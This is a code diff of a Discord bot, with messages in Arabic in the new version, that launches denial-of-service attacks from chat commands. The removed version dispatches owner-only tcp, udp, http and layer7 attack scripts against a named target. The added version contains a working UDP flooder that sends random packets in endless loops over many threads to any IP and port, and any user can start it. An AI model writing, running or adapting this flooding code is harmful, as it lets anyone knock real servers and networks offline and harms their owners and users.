@@ -1,94 +1,53 @@
-import discord
-from discord.ext import commands
-from discord.ui import Button, View
-import subprocess
+import os
+import random
 import threading
+import socket
+from discord.ext import commands
 
-OWNER_ID = 898663928308060180
+TOKEN_FILE = "token.txt"
 
-intents = discord.Intents.default()
-intents.message_content = True
+def get_token():
+    if os.path.isfile(TOKEN_FILE):
+        with open(TOKEN_FILE, "r") as f:
+            token = f.read().strip()
+            if token:
+                return token
+    token = input("يرجى إدخال توكن البوت لتشغيله: ")
+    with open(TOKEN_FILE, "w") as f:
+        f.write(token)
+    return token
 
-bot = commands.Bot(command_prefix="!", intents=intents)
+TOKEN = get_token()
 
-attack_process = None
-attack_lock = threading.Lock()
+bot = commands.Bot(command_prefix="!")
 
-def run_attack_process(args):
-    global attack_process
-    with attack_lock:
-        if attack_process and attack_process.poll() is None:
-            return False
-        attack_process = subprocess.Popen(args)
-        return True
+def udp_attack(ip, port, times):
+    data = random._urandom(1460)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    addr = (ip, port)
+    for _ in range(times):
+        try:
+            sock.sendto(data, addr)
+        except:
+            pass
 
 @bot.event
 async def on_ready():
-    print(f"Bot connected as {bot.user}")
+    print(f"البوت شغال كـ {bot.user}")
 
 @bot.command()
-async def attack(ctx, method: str, target: str, port: int = None, duration: int = None):
-    if ctx.author.id != OWNER_ID:
-        return await ctx.send("Unauthorized.")
+async def attack(ctx, ip: str, port: int, times: int, threads_count: int):
+    await ctx.send(f"بدأ الهجوم على {ip}:{port} - عدد الحزم: {times} - الخيوط: {threads_count}")
+    
+    def run():
+        while True:
+            udp_attack(ip, port, times)
+    
+    for _ in range(threads_count):
+        thread = threading.Thread(target=run)
+        thread.daemon = True
+        thread.start()
+    
+    await ctx.send("الهجوم بدأ!")
 
-    method = method.lower()
-    args = []
-
-    if method == "tcp":
-        if not all([port, duration]):
-            return await ctx.send("Usage: !attack tcp <ip> <port> <duration>")
-        args = ["python3", "tcp_attack.py", target, str(port), str(duration)]
-
-    elif method == "udp":
-        if not all([port, duration]):
-            return await ctx.send("Usage: !attack udp <ip> <port> <duration>")
-        args = ["python3", "udp_attack.py", target, str(port), str(duration)]
-
-    elif method == "http":
-        if not duration:
-            return await ctx.send("Usage: !attack http <url> <duration>")
-        args = ["python3", "http_attack.py", target, str(duration)]
-
-    elif method == "layer7":
-        if not duration:
-            return await ctx.send("Usage: !attack layer7 <url> <duration>")
-        args = ["python3", "layer7_attack.py", target, str(duration)]
-
-    elif method == "proxy":
-        if not duration:
-            return await ctx.send("Usage: !attack proxy <url> <duration>")
-        args = ["python3", "proxy_attack.py", target, str(duration)]
-
-    else:
-        return await ctx.send("Unknown method. Available: tcp, udp, http, layer7, proxy")
-
-    started = run_attack_process(args)
-    if not started:
-        return await ctx.send("Attack already running. Stop it first.")
-
-    desc = f"Method: `{method}`\nTarget: `{target}`\n"
-    if port: desc += f"Port: `{port}`\n"
-    desc += f"Duration: `{duration}`s"
-
-    embed = discord.Embed(title="🚀 Attack Launched", description=desc, color=0x00ff00)
-    await ctx.send(embed=embed)
-
-    stop_button = Button(label="🛑 Stop Attack", style=discord.ButtonStyle.danger)
-
-    async def stop_callback(interaction):
-        if interaction.user.id != OWNER_ID:
-            return await interaction.response.send_message("Unauthorized", ephemeral=True)
-        with attack_lock:
-            if attack_process:
-                attack_process.kill()
-        await interaction.response.edit_message(embed=discord.Embed(title="🛑 Attack Stopped", color=0xff0000), view=None)
-
-    stop_button.callback = stop_callback
-    view = View()
-    view.add_item(stop_button)
-
-    await ctx.send(view=view)
-
-if __name__ == "__main__":
-    token = input("Enter your bot token: ")
-    bot.run(token)
+bot.run(TOKEN)
